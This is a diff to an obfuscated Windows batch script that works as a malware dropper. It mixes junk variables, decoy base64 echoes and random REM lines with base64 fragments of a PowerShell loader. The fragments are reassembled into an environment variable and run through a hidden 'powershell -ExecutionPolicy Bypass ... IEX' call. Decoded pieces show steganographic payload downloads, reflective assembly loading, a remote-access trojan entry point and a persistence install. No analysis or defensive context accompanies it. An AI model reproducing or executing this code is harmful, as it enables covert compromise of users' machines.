+echo dnp2YkZCSjJiQlYxTlU4Y3cwa1JaS3Ayc2lEUVpkbTFERmI4cDZUUGwwUGx6T0k= >nul 2>&1
+sE%pNl%t "cvPVhkJy=fjUwOHiJDDZCeSfHUF"
+sE%sKL%T "ZAyhDXPOwi=OeWreMSCyvNxCuMhlfiBDJt"
+REM phantom cipher sword zenith
+se%ISnWd%t "DqnLpp=jICXudyNmrjdOBGEPjpihoLmkOrrzkiCCoN"
+Se%SdUX%t "fqsaEhxJtSsmPt=fmuGXrdnOkoqHNXGSjeaBzpuqUMD"
+echo QWlqWHFESG5iQm1uR3VFWmE4TWM0TE5wMjgzeG1UMTBPQlFtUjJCYmptQ0NBU1l4SUdTa1lHTm9KdUll >nul 2>&1
+echo a2k5dXFEREl1Z0FFYzFxZUljdUkwMFdsc0d5dFBjSnVTMDlHdzBzaVRGTll4UUdNUWF5 >nul 2>&1
+SE%xBulb%t "nDMzciSYw=DNmjUBpqTKLmykkGbNllXknEqSmRtfA"
+echo Q2V4TndCb2dFYk02Y1ZKd1UxSTg0Uk10NnZlOHNZWDZuTURiQTRINXVMMGFDZlFqMm1GcHBoYXZETzZHbzhCZg== >nul 2>&1
+echo TmpCWTNlQVdZRkhJc0N1NzFEcHlaYWdsMHZIOURvM2xPWENFR3BjVFpQbnVTb2JW >nul 2>&1
+echo UnZob1cxOWUya3ZGTEdSRzhzYmVSakFabEFUOXE2djJuOXJNb2hHZEZYanBNTQ== >nul 2>&1
+se%kZOHe%t "BIaqoIidebO=LWUuqoyfOEThbAsoWuoMQrh"
+se%Spp%t "JnaaTP=kuJyynykcjeOuoNuhdDfAMlifFbkyCRCXV"
+echo VkhSeFFCc0RjOVBSU3d0VmpBV2IxRVJibUdqaGMxaURMYmI1VmJaVjcxY0o1alNDcm9aZjdla0QzdkxRQ1V4cGhOM3dwMQ== >nul 2>&1
+se%oAtcz%T "hCCTGMmET=fmBnVhikALkesUEo"
+se%tec%t "MRnXHbvICnCdBQ=IMwAjAWOoCuKxQlItASgSsvropXKUDU"
+REM shadow shadow kappa fathom binary shadow pixel binary phantom
+REM glimmer strobe clearing fathom fragment
+REM vertex zenith phantom sword
+se%xlGT%t "fffobYjeSTCg=RMviXbAXylZaRmTJE"
+REM circle strobe strobe hawk ruby fathom guard
+SE%VyWS%T "XTlnTN=nMjxaghbrdUFVJEurhxlWzurgHp"
+REM pixel beacon twilight binary guard vertex fragment twilight
+REM clearing glimmer pixel fathom odyssey
+sE%bDO%t "cuOgIiPWP=rSyedzZjxgtmXEweUxoDyzi"
+Se%JvqBP%t "ULzGfvqP=NOaJGxMhcIyNqt"
+REM delta kappa fragment delta zenith binary mirage vision binary
+echo MzVxdjRZM1poYU1IeFlnNDhKVE5FcmhYZ3FFcG1zQmxHb2xoSVdNSEpqSlFaVGRkUlpicXhnbjVrWG9EakJ4MA== >nul 2>&1
+echo RzlmTHBzY0k5S3RFd3Bpdml3a1lIQnJlcjQyZXVTOEtkbEtuV3IyamJ4b1k3TW1MTjZoVUtIV21xd2hQY2w= >nul 2>&1
+REM vision kiln beacon kiln fragment cipher odyssey clearing
+echo c0dhWHR2UVJCQ3VGWjUzRTdYUkllRWNtbmZNd2QxeGpsckhpTWlpaURMWjZxakJJQVFkMGptbjR4TlhXVUY5Y041bXJzTFpISVU= >nul 2>&1
+REM mirage kappa hawk ruby
+echo NHp4cW5TYm1oZ2ltWGE2dkMwOE1qTGRrNXVaam4xOGVPaUdMU3BhT0t4 >nul 2>&1
+REM fragment fragment guard kappa hawk
+se%wbb%t "baSWccJjxzAn=KnpKNzGKhSfXeaMEuwhJCmyVf"
+REM echo valley kappa
+REM sword valley shadow shadow binary valley clearing
+REM binary delta mirage vision
+echo cHpzOVJ5cW1QcG43bmpXcU9USWtRNGdoVEw5RlJJc3pSSE9HTkxQYlF2VWNWR3RSUXlZVFVWQjdwbFZnWm51amhyWjlpV0hINWJKYWRv >nul 2>&1
+REM phantom binary valley clearing vertex kiln pixel odyssey fathom
+REM hawk mirage circle ruby fathom twilight
+sE%XiC%t "cEaFgTRLlCp=ZXQpIHsgJHRhcmdldCA9ICRJbWFnZVBhdGggfQppZiAoLW5vdCAkdGFyZ2V0KSB7ICR0YXJnZXQgPSAkSW1hZ2VVUkwgfQppZiAoLW5vdCAkU2lsZW50KSB7ICRTaWxlbnQgPSAkZmFsc2UgfQpmdW5jdGlvbiBMb2ctU2lsZW"
+echo aFM3aU56VnVEcDQ2MVliR2p1UGJlNU5oMTRPRmdkY25GTDd1ekxHUXozQ0k2bGZxc1dIeWw4c2VkZ25CMFV2 >nul 2>&1
+sE%dbh%t "XzKZwNtF=VbIichhhcu"
+echo cHcyUEIzSThCNWxzNElpZWs3eUl2cjNZUGRsZURzVXJ3R0tLRk13Zld3Qldhd1JaVQ== >nul 2>&1
+Se%fNBt%T "LxzahUq=YpedKzhBfXRqOmuEANZc"
+sE%OSd%t "PbAjuygvnj=FnmsXCwcApRlKfaIsDqiFRHxyzctOVlt"
+REM echo kappa hawk lance lance undergrowth beacon
+REM phantom lance phantom echo twilight ruby beacon shadow
+echo ek9EVGVma2I2b2lUZE5VT25Wb1RxbWt2WFZUd2pScEFOY3E2aGJaeGdIY3hCV2xVMTlZbkFqY2F6clFPUA== >nul 2>&1
+sE%jBz%t "yyYZrYLeJcR=YJGmxcmDqHSZugFvmNLHQqY"
+REM vision echo clearing beacon glimmer
+Se%ZgAOA%T "RMlmSdaUt=GnAWeZWNfcdBLwnZJppHEDgf"
+echo M3RyRmN6VWx4bDZ5cFhLS1FQb053SFpqYkFxT2hweXdPVXJac0ZXaWg2SFhpZTJoM2JhREZHTjNvNVJBRkRhWTBW >nul 2>&1
+sE%hhF%T "wIvhrChlg=cyBZLVQFDriXnIUNpGGHNhpc"
+se%beFA%T "LumOTPPz=ylIeQcgsTeZASJjZeVYlAlWvxLMRs"
+SE%efyt%T "lJuHLtLIcRI=qLmXpklZpbxfVGSIGppjjvvqepfqLwVXOhD"
+REM kappa vision ruby phantom zenith beacon echo
+sE%zpGx%t "EmTomphYCcpo=XNYAHqnxCTZZxQMvkZvcQNExyFH"
+REM beacon cipher hawk guard circle binary delta valley vertex
+REM strobe vision delta undergrowth twilight vision delta
+echo MThuZVRsWjY5UUVGcTdoeG9pSjhoeGx6Z0dpdmFQT2c2Ynp2VmJWYVc= >nul 2>&1
+REM hawk kappa vision kiln valley phantom cipher delta fathom
+REM fathom delta cipher vision ruby vision glimmer
+se%FWQ%T "jZlRaCdWMg=CSCourdzQNdBYfVzaJLEColNsCzAaFxN"
+REM vertex mirage glimmer
+REM hawk lance echo phantom kappa mirage core
+echo SlU4N3BidjFNSnhIWEdLT3ZQSWhwazZDSDFzOUxkdklBekpyeXdQSVk= >nul 2>&1
+echo YlRrNURFUDZVeVNEbDc1clRzZHgybFBLdUlxUlFmVTVGbnppSVhmOTQwSmkzTDZZOWZPVWZwQg== >nul 2>&1
+Se%Nor%t "hPgSJJqeXLtzr=XYwlkNDlJfyfLOGzqdTVc"
+echo WjVXTTR2Y1BqaFd6QXc3TlVFSEg2aVYwdnY0blRZbEZzcGkyRkNNT0kxbU04YUsxQTMyYWNLUmF4aGxmSTZacDhmQ0E= >nul 2>&1
+sE%abbRr%t "AJAapyQN=zHZkmzKzyauU"
+SE%FpJZ%t "nNBEOTwnIWoGE=qLGWmCacBDYzXSZGxcnL"
+REM vertex sword vertex strobe
+Se%HCu%t "SSFrqWwrRkrsX=nJddOKcgJjhfQbfJlfbkyRMN"
+echo MnZuOEJ4YWIyY3NTZ0ozeExEN2JCTkEzVU4xbktocDlMNm12WHVYeWpOMG1uTFJtS21WQnRjWDVxdk53NXV6M2pwWEtLYXpv >nul 2>&1
+Se%AhMG%T "CLraRmUcoA=GAFiNxtJgRgWhbMDbiMrJmmkHPCRgXBEjeJ"
+REM cipher lance hawk lance cipher zenith
+echo c3U3Vlo4RE11N2szVzN5clVFRzRNQWRjbzRmZVhhZ3pwUnVKcXhGWFpIMEJ1dEtISU5T >nul 2>&1
+REM fragment clearing binary zenith hawk
+se%iKao%t "KyzzyNWblPvhdZ=HsvdIEQOOTAVweboZZDKDFJRswH"
+REM vertex odyssey hawk odyssey
+echo YnRhaXFTSmtFeUo2U3JwOVVZeXBRUFplMm1sSGRRQ1dVd1ZpeElNcQ== >nul 2>&1
+REM glimmer vision zenith core cipher beacon
+Se%yfMq%T "MLyxiMejzTbyr=lPjdrKjIxCRZhoewlR"
+sE%vzlm%T "KrujiljF=ZS5TY29wZU5hbWUgLWxpa2UgJ1N5c3RlbS5kbGwnIH0KJHdpbjMyID0gJHAuR2V0VHlwZSgnTWljcm9zb2Z0LicgKyAnV2luMzInICsgJy5VbnNhZmUnICsgJ05hdGl2ZScgKyAnTWV0aG"
+REM binary fathom glimmer shadow twilight vertex core circle
+SE%ocDzk%T "BwTJVRznwHJu=IfHRPlrxCSvGSu"
+REM vertex kiln echo circle beacon
+se%zWS%t "XYFiiGzSHXnNuoX=AWwnyzeOKFNdycrkuRMsvigLAqEqfBO"
+SE%kWI%t "HiRCuqo=OPntUWkbIfWsANMKmkJk"
+REM hawk twilight twilight
+REM shadow clearing pixel valley clearing beacon
+REM undergrowth zenith pixel vertex odyssey guard circle hawk shadow ruby
+echo bWhmV1FWSW5KMEFHbVJIbndxVGN3bXpVQ1RYR3Zoa29nenozSkV4bHc3OUJSN3JXMG9ITTBYR25XRkgxY1FpUnZYUXFYMWlSSnc= >nul 2>&1
+REM beacon lance sword
+SE%fOW%T "dkvBUz=W50CmlmICgkZW50cnkpIHsKTG9nLVNpbGVudCAiWyFdIEludm9raW5nIEVudHJ5UG9pbnQuLi4gKFNlc3Npb24gd2lsbCBibG9jayB1bnRpbCBSQVQgY29tcGxldGVzIG9yIGNyYXNoZXMpIiAiQ3l"
+Se%KWl%t "VaNogkmIr=Y2UpIHsKTG9nLVNpbGVudCAiWypdIExvYWRpbmcgc3RlZ28gZnJvbSBsb2NhbCBwYXRoOiAkU291cmNlIgokZGF0YSA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkU291cmNlKQp9I"
+SE%JlL%T "EonCbKSbnuzH=wUFebJajooxIQVxlrJwPQoAxXoyq"
+REM shadow fathom shadow phantom fragment
+SE%Svyu%T "GRrMAKJwmsvTURz=UHpiebrSOJkNFNsZOofUb"
+REM sword shadow pixel cipher vertex twilight valley valley fathom
+REM fragment lance cipher fragment fathom lance
+se%mSSx%t "xsUJmqnsxnIyk=LhIJOyQSjwpxbxDKFEbrdABdoUJj"
+REM lance guard fathom zenith binary mirage cipher fathom kappa
+Se%laE%t "DekiUxuXDIyDO=XERyeDuyocthTLDCKYdaabUtdx"
+echo U3l6YnhjZkJWbHZ5NEZPYmw0RU5aV0tzdmJnRE5sTUpsMkxyVXdLVWNvaWFwY25GOXlXZXVRTzFRY1dvQXp0OEttdUdwM1AyY1hBUjlublE= >nul 2>&1
+echo bDBLQ2xBUEE4eEd2dUQ0YUpIblI2M2lIcVdWZXlLT0NBR291akN4QUo= >nul 2>&1
+sE%FVXI%T "yfpVIAEN=TAHpoHQWNEDKxBYobggoKNMufjy"
+sE%oUtYE%t "UIqfTykZJn=nqbqyDijhbPQlyNPMOhim"
+SE%dUM%t "kAyNQUMfgjBk=BrgFLLUTejPXclhaMkfWVf"
+echo ZHFaMmZKMldKSzlWNE9WRVp4T0EwMWlYOU92WjJHQVBpQUZuOTFXTzdWY29RVkJYa2E= >nul 2>&1
+se%kAlzr%T "ELWVTTVYDFASl=SQTXAtqLpqmxjGigxoSQpoMS"
+Se%zKbG%t "SNvTAyPsvdBH=9kcycpCiRrMzIgPSAkd2luMzIuR2V0TWV0aG9kKCdHZXQnICsgJ01vZHVsZScgKyAnSGFuZGxlJykuSW52b2tlKCRudWxsLCBAKCdrZXJuZWwnICsgJzMyLmRsbCcpKQokZ3BhID0gJHd"
+Se%aqpVQ%T "hiidpqAHjd=l0gJCgkZXguTWVzc2FnZSkiICJSZWQiCkxvZy1TaWxlbnQgJGV4LlN0YWNrVHJhY2UgIlJlZCIKfQpbU3lzdGVtLkFwcERvbWFpbl06OkN1cnJlbnREb21haW4uYWRkX1VuaGFuZGxlZEV4Y2VwdGlvbigkb25F"
+SE%EqeK%t "aicAtujEgsP=JteNAreIrNdlPIinXwjwOu"
+REM mirage valley beacon delta shadow kappa lance zenith
+echo UUE2WmlHOUZ1U3AyOE45TFFwUFFFRkgzT0tqVkJ4QXVSMEtZNGZUMWw4QlBUM2V6QTJ4ZkJpeFVmVkJjWkxHTUpBaVJIZzlEUE0= >nul 2>&1
+echo UU1hQzFJZEpGVHhnVkQ3RUFLcmFZWmtZZnhLdHd1Y1BVWk5jVkl3djF6ZA== >nul 2>&1
+echo cTkwRXBZSG1VaWhWY0ZRQkFtTlpUVWRSM0NSS0RMQldINklocnoxN1BmU2JwSFpoRzQ= >nul 2>&1
+echo amxJOHRPaW5ianlCZ0VoYXVwd0d2R1g2elN4OEVpWUZJQ2d3U0tqMQ== >nul 2>&1
+Se%QNpCm%t "bqWqpKa=TzstZEvfoPLShPHdjROde"
+REM circle ruby binary valley
+sE%HPDIZ%t "ZobTxXZgxtZQMiw=bmYKnxkUWEtEuzHlfHxUPH"
+Se%SFxLv%T "aAcXOz=vYWRNZXRob2QuSW52b2tlKCRudWxsLCAoLCRyYXdQRSkpCkxvZy1TaWxlbnQgIlsrXSBBc3NlbWJseSBMb2FkZWQ6ICQoJGxvYWRlZC5GdWxsTmFtZSkiICJHcmVlbiIKJGVudHJ5ID0gJGxvYWRlZC5FbnRyeVBva"
+Se%EFV%T "McjWnv=FBTSXFcrUpPLkAQFFvtaRqKuCu"
+SE%ULWaR%t "RaytieyxqY=aoGBarWGTVhgpbmA"
+Se%zjrf%T "YQERhdhT=TCyfSoJhMgxAdgKIANDlrdpKlVDHIjMRF"
+REM circle glimmer guard cipher vertex
+Se%xahZ%T "sGOZDxpU=kwoDDMCeFXKgfZ"
+REM sword glimmer echo circle shadow ruby kappa echo ruby guard
+Se%PuNOd%T "wlYuyCMKviRxVs=HsAzSDxPbpGifmHQrJTrAfWdmGfN"
+se%dfV%T "ygKIyobtYilDLkE=JIznXeJLcXOpLaAPVgmrDWPobrTh"
+REM core pixel delta binary core pixel vertex zenith fathom kappa
+REM zenith lance glimmer
+SE%zab%t "bPkcvnmLVl=ZpHkBTRcqIVrtFEHy"
+REM shadow pixel echo phantom twilight
+Se%UEpX%T "mIZPKrgPVnOUC=aEGBvSKCxVxPKsulOjMUuagYYUjmV"
+REM shadow lance kiln strobe valley vertex echo strobe pixel
+sE%oINx%t "kqwPdNeou=LBxupEgisdxzh"
+echo bzlBdkxJM3RCZVJJdWQ5dHFXVWVWVHVPV1I4azhlaXpvU3RFcnVxTXY4VlZhZ285b1MxUGZPbFNyYXBackE2bVJ0 >nul 2>&1
+echo OG9nU0lYY0VZS1VBMzFXZU0wTUxCNEpCVHhpc0JQNmNjckNvbG5Za3VtTm9ncU5WR2FOdmVzd0hQYW1KV0kzcVM1ZUE= >nul 2>&1
+SE%gst%t "coqtlmWZn=XRhKQokYm1wID0gW1N5c3RlbS5EcmF3aW5nLkJpdG1hcF06OkZyb21TdHJlYW0oJG1zKQokdyA9ICRibXAuV2lkdGgKJGggPSAkYm1wLkhlaWdodAokcDAgPSAkYm1wLkdldFBpeGVsKDAsMCk7ICRwMS"
+se%GOd%t "TjHhkpb=ZmlsZSB5ZXQuIiAiWWVsbG93Igp9IGVsc2UgewpMb2ctU2lsZW50ICJbKl0gVHJpZ2dlcmluZyBwZXJzaXN0ZW5jZSBpbnN0YWxsYXRpb24gZm9yOiAkUEVSU0lTVEVOQ0VfVVJMIgpJbnN0YWxsLVBlcnNpc3RlbmNlIC"
+echo MXU5NU1KaURpMjY5Nm5rdWlLUzVTUjFKdjFFN0VZdmxsbGVScEdlWA== >nul 2>&1
+REM hawk fragment pixel
+REM twilight undergrowth ruby beacon vision sword valley
+REM zenith delta phantom guard beacon glimmer mirage core
+Se%SHD%t "QsumGC=mllarumzDnwFTWEMiuCRpPpikw"
+REM sword odyssey kappa pixel
+se%KIH%t "sxBXYBiEodhn=HB4LkIpOyBpZiAoJGV4dHJhY3RlZC5Db3VudCAtZ2UgJGxlbmd0aCkgeyAkZG9uZSA9ICR0cnVlOyBicmVhayB9Cn0KaWYgKCRkb25lKSB7IGJyZWFrIH0KfQokcGFja2VkID0gJGV4dHJhY3RlZC5Ub0FycmF5KCk7ICRibXAuRGlzcG9"
+echo UlBTMWZ1NVVITWdkN250Y2R3U1AyWnZYN3NYeUdnUDN0ZnVEUHhHYkFMWVlLNDR6Y3ZtMVZZc3VMdE55ck5ERlczNDBSWDVnOVp3eFc5 >nul 2>&1
+Se%PeDlu%t "MvXSpwkLxlCm=jTdrQAKGagKmKqA"
+se%yNcF%T "AyiVuN=aWxlbnQgIlsqXSBEb3dubG9hZGluZyBzdGVnbyBmcm9tOiAkU291cmNlIgokd2MgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiR3Yy5IZWFkZXJzLkFkZCgiVXNlci1BZ2VudCIsICJNb3ppbGxhLzUuMCAoV2luZG93"
+REM mirage fragment circle echo hawk core twilight
+sE%TcDVE%t "eobGEoyNee=aDYLfuEjZvvZGAnGARdd"
+echo ejA2bVdDbWVjS3BUZHVaajlIS2F2d1M4V0VWdEFiSWtjbTZxTXEzYXFhWnowVVlRenJjeTFjN3kx >nul 2>&1
+se%fwXHD%t "VoBqfRRlsEIhsk=zORpwlgYWetMwVGMYSDGoCJ"
+echo U1A0VGdnaDJuUktqNnVRWEZvVHNSS0JTRDI1WkJCS3BORnFkdGpvTHJackwyaFhZZDJ1SWU1NDVsRg== >nul 2>&1
+REM lance shadow delta odyssey binary delta echo lance
+SE%vylU%T "iiUzJT=NgzldqSGFoWtydm"
+echo MVZydzZtVGoybVh4NDJPYnRNalZLN1kwT3dxRWMxQ29lT1RWRnBybnMz >nul 2>&1
+echo dGpiaXhZT1VLVnpNM1BlbkdVVHBhSmVXRkhrbXpxdGhRNXp2SDNpUFpUamxvMFU1YXY4VTc5Z3NNeHg3aHFRUXA3R2xTa2lYV0xZcw== >nul 2>&1
+se%TPDI%t "TLoaEZYHteRITBk=HVEbmfElRTpFCPFKQU"
+REM twilight valley echo guard valley shadow
+echo R2ZJdmI0U05EbVdLMG5zWTVwOGpkRzNtQ1FJSUg5SzkyUzN0NE9EUFpNNExGRGZKa0RXTHJTd1Q3Qkl2VmUwTUdrRmpnNG0= >nul 2>&1
 
 REM --- Reconstructing Payload Variable ---
-set "ocIxBfHG=%ocIxBfHG%%lybmSwTFZ%"
-set "ocIxBfHG=%ocIxBfHG%%GShjykGNjtB%"
-set "ocIxBfHG=%ocIxBfHG%%soNqMxD%"
-set "ocIxBfHG=%ocIxBfHG%%WDwQNiOhuDLH%"
-set "ocIxBfHG=%ocIxBfHG%%VGfUyMYJ%"
-set "ocIxBfHG=%ocIxBfHG%%IioLlN%"
-set "ocIxBfHG=%ocIxBfHG%%qlWomP%"
-set "ocIxBfHG=%ocIxBfHG%%tEiIQB%"
-set "ocIxBfHG=%ocIxBfHG%%ClFTbZGpujJi%"
-set "ocIxBfHG=%ocIxBfHG%%BPAgMjELCBo%"
-set "ocIxBfHG=%ocIxBfHG%%DQAKlxCt%"
-set "ocIxBfHG=%ocIxBfHG%%IudUedVHi%"
-set "ocIxBfHG=%ocIxBfHG%%HcOemUWbJxTi%"
-set "ocIxBfHG=%ocIxBfHG%%fWdSmsVuD%"
-set "ocIxBfHG=%ocIxBfHG%%pTUyGhOs%"
-set "ocIxBfHG=%ocIxBfHG%%CxvAnanTEAMz%"
-set "ocIxBfHG=%ocIxBfHG%%havGRhxK%"
-set "ocIxBfHG=%ocIxBfHG%%biYVcBDkenQ%"
-set "ocIxBfHG=%ocIxBfHG%%wJaKsAEdbHAr%"
-set "ocIxBfHG=%ocIxBfHG%%qtDAXoD%"
-set "ocIxBfHG=%ocIxBfHG%%ikXmWCG%"
-set "ocIxBfHG=%ocIxBfHG%%TdwmslqsbUc%"
-set "ocIxBfHG=%ocIxBfHG%%cYQdKfaH%"
-set "ocIxBfHG=%ocIxBfHG%%JJQibaKR%"
-set "ocIxBfHG=%ocIxBfHG%%FEWJytF%"
-set "ocIxBfHG=%ocIxBfHG%%dnEvJHNGCPyI%"
-set "ocIxBfHG=%ocIxBfHG%%yhLmCm%"
-set "ocIxBfHG=%ocIxBfHG%%HtsxofviF%"
-set "ocIxBfHG=%ocIxBfHG%%SrARWl%"
-set "ocIxBfHG=%ocIxBfHG%%YYrLUT%"
-set "ocIxBfHG=%ocIxBfHG%%KErYfUDiuio%"
-set "ocIxBfHG=%ocIxBfHG%%RvjpCIsQaErX%"
-set "ocIxBfHG=%ocIxBfHG%%pkzgIzwOgQe%"
-set "ocIxBfHG=%ocIxBfHG%%jIWfqQNzL%"
-set "ocIxBfHG=%ocIxBfHG%%cISUnH%"
-set "ocIxBfHG=%ocIxBfHG%%TihSmPRxIceW%"
-set "ocIxBfHG=%ocIxBfHG%%NAPjgGFDfsw%"
-set "ocIxBfHG=%ocIxBfHG%%eXMqMZYpANu%"
-set "ocIxBfHG=%ocIxBfHG%%pbhbMKOyN%"
-set "ocIxBfHG=%ocIxBfHG%%PzKlaeLLS%"
-set "ocIxBfHG=%ocIxBfHG%%YRWjobAj%"
-set "ocIxBfHG=%ocIxBfHG%%OsybKDFI%"
-set "ocIxBfHG=%ocIxBfHG%%DxvoHFZaBJCO%"
-set "ocIxBfHG=%ocIxBfHG%%UuZTAf%"
-set "ocIxBfHG=%ocIxBfHG%%CcqJaL%"
-set "ocIxBfHG=%ocIxBfHG%%IrqfOCO%"
-set "ocIxBfHG=%ocIxBfHG%%GTelxvAKSYU%"
-set "ocIxBfHG=%ocIxBfHG%%KwwxwiN%"
-set "ocIxBfHG=%ocIxBfHG%%GqKnhg%"
-set "ocIxBfHG=%ocIxBfHG%%gavjQbUOwbvv%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%CyLWXbpmCFgE%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%KrujiljF%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%SNvTAyPsvdBH%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%iSIUTRpSVXvr%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%iaiHgnDsVM%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%zNBOGPNWs%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%GnCFTiD%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%YkJMgR%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%vYsTMtLht%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%ZDaiHFmV%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%tPZdNEL%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%cEaFgTRLlCp%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%uSZYTfkHKi%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%NYQygHPb%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%KDYuDr%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%qIDYcfrcRyCn%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%ZAEVbCXtFlP%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%LbBZKF%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%gcFqrBendlxk%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%WJzkxbqmdblf%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%RycmiuTWAH%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%ETWnNEmEhm%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%NGkMSSVmQb%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%ColxxeWAu%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%nWVTyn%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%zsfhbtp%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%vwBjslhZ%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%uXWcnULu%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%TjHhkpb%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%SpiCfRn%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%NuGHguYwh%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%loHWcOhQG%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%hiidpqAHjd%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%LwktZSE%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%AyiVuN%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%XpSHIoWYkff%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%VaNogkmIr%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%PhwzjotAxi%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%coqtlmWZn%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%xvhlyyqJhCW%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%VHkYLOnh%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%UhyIXDyHqBr%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%GEEkUuZSCptk%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%rmXMbXAjoZjN%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%sxBXYBiEodhn%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%uORopMEtc%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%SIxolQzZh%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%saokYo%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%eNVNQj%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%BEgHgCeydig%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%UbbJmHOTKfwM%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%pGyCJFWzjUb%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%aAcXOz%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%dkvBUz%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%IPptDvJh%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%TUjEdkeIIhY%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%GChdgdWzMcU%"
+set "PhzOnkOoQNn=%PhzOnkOoQNn%%eqrqtZwC%"
 
 REM --- Reconstructed Payload Trigger ---
-powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$Silent=$true; $b=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:ocIxBfHG)); IEX $b" >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$Silent=$true; $b=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:PhzOnkOoQNn)); IEX $b" >nul 2>&1
